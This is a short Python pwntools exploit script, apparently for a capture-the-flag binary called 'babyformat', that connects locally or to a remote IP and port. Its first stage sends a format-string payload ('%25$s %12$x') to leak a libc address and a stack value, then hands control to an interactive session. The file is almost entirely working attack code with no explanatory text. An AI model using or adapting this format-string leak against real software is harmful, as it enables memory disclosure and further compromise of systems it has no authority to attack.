#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('babyformat')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        if args.REMOTE:
            return remote("104.196.99.62", 2222)
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# leak libc and stack
def stage1():
    io.recvuntil('\n')
    io.send("%25$s %12$x")

    free_addr = u32(io.recv(4))
    io.recvuntil(' ')
    libc_main_start_addr = int(io.recv().strip(), 16)
    print (hex(free_addr), hex(libc_main_start_addr))

stage1()
io.interactive()

